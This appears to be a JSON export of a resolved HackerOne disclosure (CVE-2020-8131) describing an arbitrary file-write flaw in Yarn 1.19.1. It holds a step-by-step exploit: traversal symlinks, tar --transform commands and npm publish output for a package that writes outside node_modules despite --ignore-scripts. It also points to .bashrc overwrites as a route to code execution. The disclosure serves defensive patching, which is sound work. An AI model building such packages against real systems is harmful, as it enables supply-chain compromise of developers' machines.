{
  "id": 730239,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzAyMzk=",
  "url": "https://hackerone.com/reports/730239",
  "title": "Filesystem Writes via `yarn install` via symlinks and tar transforms inside a crafted malicious package",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-11-06T08:13:31.709Z",
  "submitted_at": "2019-11-06T08:13:31.709Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rhyselsmore",
    "url": "/rhyselsmore",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2020-8131"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-02-15T00:33:41.258Z",
  "bug_reporter_agreed_on_going_public_at": "2020-02-15T00:33:41.187Z",
  "team_member_agreed_on_going_public_at": "2020-02-07T08:58:09.575Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report an arbitrary filesystem write vulnerability in Yarn when installing a malicious package from the default repositories. This vulnerability has the potential for RCE -- even if `--ignore-scripts` is disabled.\n\nIt allows a malicious package, upon install, to write to any path on the filesystem -- For example, `yarn install my-malicious-package --ignore-scripts` can write a malicious file anywhere on the filesystem. This may be changes to `.bashrc`, `.yarnrc`, `.npmrc` etc, or modifications to other known dependancies -- all which give the ability for RCE.\n\nThe outcome here is that a malicious package, particularly a popular one, installed in what is thought to be a secure fashion, actually has filesystem write abilities.\n\nAsset was not selected as it was not in the list.\n\n# Module\n\n**module name:** yarn\n**version:** 1.19.1\n**npm page:** `https://www.npmjs.com/package/yarn`\n\n## Module Description\n\nFast, reliable, and secure dependency management.\n\n## Module Stats\n\n1,088,779 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\n### Objective\n\nAs part of my research, I had come across the need to write an arbitrary file using `yarn install` in order to escalate a vulnerability.\n\nThis target did not allow for yarn post-install hooks, but they did have one other bit of functionality that relied on a file being present in a certain directory outside of the node module installation path in order to trigger a vulnerability. \n\nAs such, I decided to investigate if it was possible to write this file via a malicious package installed via `yarn`.\n\nFor the purposes of this report, the file we want to write is `/tmp/my-file` - however it should be noted that the outcome of this report is that I am able to write to any new or existing file on the filesystem on behalf of the user calling `yarn install`.\n\n### Yarn Package Installation\n\nThe yarn package manager, by default, allows for the execution of arbitrary shell commands during package installation.\n\nThis in itself allows for arbitrary file system writes. Take the following package.json as an example:\n\n```\n{\n  \"name\": \"my-malicious-package\",\n  \"version\": \"1.0.38\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"postinstall\": \"echo â€˜fooâ€™ > /tmp/file\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\nUpon running `yarn install my-malicious package`, the command `echo â€˜fooâ€™ > /tmp/file` will be run after a successful package installation.\n\nThis functionality is disabled by adding the `--ignore-scripts` flag to the installation command. As such, running the command `yarn install my-malicious package --ignore-scripts` will not execute our command.\n\nAll other behaviours of `yarn install` are deterministic based on the system configuration. That is, binaries, installed dependencies, package caches etc will all be placed in the expected directories based on the configuration of the system, and no other side-effects will take place.\n\nWith that in mind, the installer of a package, who is using the `--ignore-scripts` flag will expect that no side effects except the installation of files in known directories will take place.\n\nFurthermore, with this flag, it is expected, that until such time that the package is executed (via a require within NodeJS code), that no side effects will occur. \n\n### Node Package Structure\n\nA node package takes the form of a gzipped tarball, and at its most basic, will look like so:\n\n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\n```\n\nAll other source code, binaries, assets, documentation etc - any file that is included by the package producer - is also included in this `package` directory.\n\n### Symlink Handling\n\nGiven that the package takes the form of a gzipped tarball, I decided to test if symlinks are unpacked as part of the Yarn install process. I decided to create a basic package, like so:\n\n```\n$ ln -s /tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:21 my-file -> /tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 09:51 package.json\n```\n\nI then created a gzipped tarball of the directory, pushed it via `npm publish`. \n\n```\n$ gtar -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n ```\n\n```\n$ npm publish y-1.0.0.tgz\nnpm notice\nnpm notice ðŸ“¦  my-malicious-package@1.0.0\nnpm notice === Tarball Contents ===\nnpm notice 214B package.json\nnpm notice 0    my-file\nnpm notice === Tarball Details ===\nnpm notice name:          my-malicious-package\nnpm notice version:       1.0.0\nnpm notice package size:  336 B\nnpm notice unpacked size: 214 B\nnpm notice shasum:        4f6667e5abc68053f87aff4198114dcf2556b5ea\nnpm notice integrity:     sha512-09ZKNIm3Pr+Ix[...]XmgK1FISw5cPw==\nnpm notice total files:   2\nnpm notice\n+ my-malicious-package@1.0.0\n ```\n\nI then attempted an installation of it within a temporary directory on my computer. Upon looking at the installed files, I received the following listing:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   10  3 Nov 11:26 my-file -> tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:26 package.json\n```\n\nInteresting. Any absolute path would have the leading / stripped off, thus resolving to a target that does not exist.\n\n### Symlink Directory Transversal\n\nGiven that absolute paths to a target would not work, I then decided to pull out my next trick - being directory transversal.\n\nI started by recreating the symlink, but with a different payload:\n\n```\n$ ln -s ../../../../../../../../../../../../tmp/my-file package/my-file\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   11  3 Nov 11:31 my-file -> ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:30 package.json\n```\n\nI then incremented the package version, pushed it to npm, and performed a fresh install. Upon looking at the installed files, I received the following listing:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 11:34 my-file -> ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:34 package.json\n```\n\nPerfect! It appears that yarn, when extracting the contents of a package, does not account for directory transversal in symlinks. \n\nHowever, this was only the first step in a long step of testing to find a way to inject contents into that file.\n\n### Symlink Write Attempts\n\nIn order to write to the symlink, I decided to try a number of things, including:\n\n* Searching for functionality in yarn install that would transform a file in the package into another file. I was not successful in finding a vector.\n* Creating an archive with a symlinked folder called `tmp` pointing to `/tmp`, along with a file to be extracted to `tmp/my-file`; however, yarn did not seem to extract a file into a symlinked folder.\n* Symlinking directories within `node_modules/`, such as `.bin`, `my-malicious-dependancy` etc.\n\nAll in all, I spent about 10 hours trying different mechanisms to write to this symlink that was present within my malicious package during the `yarn install` process.\n\n### Leaning on tar Transforms\n\nAfter a lot of trial and error, I decided to lean on tar file transforms. Put simply, this feature of tar allows for file contents to be added with a different path to that on the filesystem. It is basically a way to say â€œthis file on my local filesystem, I want it extracted to this location on the target filesystem.\n\nPut simply, it might look like this:\n\n```\n$ gtar --transform='s|package/my-file|package/my-file2|' -cvzf y-1.0.0.tgz package/package.json package/my-file\npackage/package.json\npackage/my-file\n```\n \n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file2\n```\n\nAlthough we placed the file of `package/my-file` into the tar archive, it will be extracted as `package/my-file2`.\n\nHowever, most tar extractors are wary of behaviour like this, as it commonly allows for attacks such as this one. As such, they do a lot of work to prevent files being written maliciously.\n\nAs part of this testing, I tried numerous methods, including my original path transversal method, as well as directory extracting into `/tmp/my-file`. Then, after several hours of testing - I had an aha moment; in our original test, yarn was extracting leading slashes from files that were being extracted when they had absolute references.\n\nIf we could create a file with a random name, with the contents of the file we wanted at `/tmp/my-file`, and could somehow put it into the tar file under an absolute path of `/my-file`, could we somehow trick yarn into first stripping the leading slash, and then extracting the contents into our symlink?\n\nTo test this, I created a file called `package/my-file`, and gave it the contents of `abc123`:\n\n```\n$ echo \"abc123\" > package/payload\n```\n\nThis gave us the directory structure like so:\n\n```\n$ ls -la package/\nlrwxr-xr-x  1 rhyselsmore  staff   47  3 Nov 11:31 my-file -> ../../../../../../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 11:33 package.json\n-rw-r--r--  1 rhyselsmore  staff    7  3 Nov 11:54 payload\n```\n\nI then created a new gzipped tar, but with an additional transform.\n\n```\n$ gtar --transform='s|package/payload|/my-file|' -cvzf y-1.0.0.tgz package/package.json package/my-file package/payload\npackage/package.json\npackage/my-file\npackage/payload\n```\n\nFinally, I inspected the contents of the tar:\n\n```\n$ gtar --list --file y-1.0.0.tgz\npackage/package.json\npackage/my-file\ngtar: Removing leading `/' from member names\n/my-file\n```\n\nIt was time to test. First of all, I ensured that no such file existed at `/tmp/my-file`, by running `rm -f /tmp/my-file`. I then published a new version of the package, and installed it:\n\n```\n$ yarn add my-malicious-package@1.0.41\nyarn add v1.16.0\n[1/4] ðŸ”  Resolving packages...\n[2/4] ðŸšš  Fetching packages...\n[3/4] ðŸ”—  Linking dependencies...\n[4/4] ðŸ”¨  Building fresh packages...\nsuccess Saved lockfile.\nsuccess Saved 1 new dependency.\ninfo Direct dependencies\nâ””â”€ my-malicious-package@1.0.41\ninfo All dependencies\nâ””â”€ my-malicious-package@1.0.41\nâœ¨  Done in 1.91s.\n```\n\nI checked the contents of the directory where it was installed, and say only two items:\n\n```\n$ ls -la node_modules/my-malicious-package/\nlrwxr-xr-x  1 rhyselsmore  staff   32  3 Nov 12:00 my-file -> ../../../../../../../tmp/my-file\n-rw-r--r--  1 rhyselsmore  staff  214  3 Nov 12:00 package.json\n```\n\nAnd finally, decided to check the existance of the file in `/tmp/my-file`:\n\n```\n$ ls -la /tmp/my-file\n-rw-r--r--  1 rhyselsmore  wheel  7  3 Nov 12:00 /tmp/my-file\n$ cat /tmp/my-file\nabc123\n```\n\nSuccess! We were able to write an arbitrary file onto the filesystem.\n\n### Steps To Reproduce:\n\nYou will need NodeJS & Yarn installed. This has only been tested on OSX systems, however it would also work on Unix systems, and will write a file into `/tmp/my-file`. Ensure this file doesnâ€™t exist first.\n\n1. Create a new folder somewhere on your filesystem.\n2. Navigate into it, and run `yarn init`. Press enter for all of the questions.\n3. Then run `yarn add my-malicious-package@1.0.50 --ignore-scripts`\n4. Check for the existence and contents of `/tmp/my-file`. It should contain `abc123`\n\n## Patch\n\nNo patch as of yet.\n\n## Supporting Material/References:\n\n> State all technical information about the stack where the vulnerability was found\n\n- Linux/OSX\n- v12.3.1\n- 6.9.0\n- gtar OSX (1.32)\n\n# Wrap up\n\n- I contacted the maintainer to let them know: Y\n- I opened an issue in the related repository: N\n\n# Please copy in a photo of two great Australian Shepherds\n\nPlease see attached photo.\n\n## Impact\n\n- An attacker bypasses the claims that `--ignore-scripts` and other hardening measures will lead to less chance of remote code execution. As such, security conscious users of Yarn will be exposed when installing packages which make use of this attack -- as will companies who download and package Yarn dependancies on behalf of end-users in sandboxes (for example, company x receives a list of packages + custom functions from an end-user, and builds them in their build servers).\n\n- Yarn generally claims that unless post/pre-install hooks are present, there is little chance of remote code execution. A through review of source code does not protect against this attack; as the attack does not live in NodeJS, nor the package.json - it is in the structure of the package itself. \n\n- For example, Bob messages Alice and says \"I have pushed the code to xyz on NPM, can you take a look?\" - Alice downloads the package using all of the secure flags (`--ignore-scripts`, `--no-default-rc`) - yet Bob is still able to write files on Alice's system, possibly leading to RCE.\n\n- Finally, in the event of a package being published maliciously (as what has been seen previously), a popular package may have an additional vector in which it can be weaponized.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 626975,
      "file_name": "sheps.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DK4TXehx4VbyTssfFKsT65eu?response-content-disposition=attachment%3B%20filename%3D%22sheps.jpg%22%3B%20filename%2A%3DUTF-8%27%27sheps.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133104Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff8081efc6d11df06d9a546f0c595680f78c552ac8e90fa4287237c5d8df9c47",
      "file_size": 110810,
      "type": "image/jpeg",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-03-08T08:58:09.640Z",
  "allow_singular_disclosure_after": -124173175.20555627,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "bl4de",
    "d3nn15"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 56841,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "yarn",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
